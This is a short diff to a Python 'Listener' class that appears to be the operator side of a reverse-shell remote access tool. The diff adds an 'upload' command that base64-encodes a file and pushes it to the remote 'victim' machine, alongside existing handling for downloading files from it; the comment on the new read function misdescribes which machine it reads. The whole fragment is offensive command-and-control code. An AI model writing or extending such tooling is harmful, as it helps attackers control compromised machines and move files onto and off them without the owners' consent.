@@ -42,12 +42,22 @@ class Listener:
             file.write(base64.b64decode(file_data))
             return '[+] Download successful.'
 
+    def read_file(self, file_path):
+    # Function which read files on victim device
+        with open(file_path, 'rb') as file:
+            return base64.b64encode(file.read()).decode()
+
     def run(self):
         # Method which run everythong - receiving, sendin, executing, etc.
         while True:
             command = input('>> ')
             command = command.split(" ")
+            if command[0] == 'upload':
+                # Appending contetn of file to upload
+                command.append(self.read_file(command[1]))
+
             result = self.execute_remotely(command)
+
             if command[0] == 'download':
                 result = self.write_file(command[1], result.encode())
             print(result)
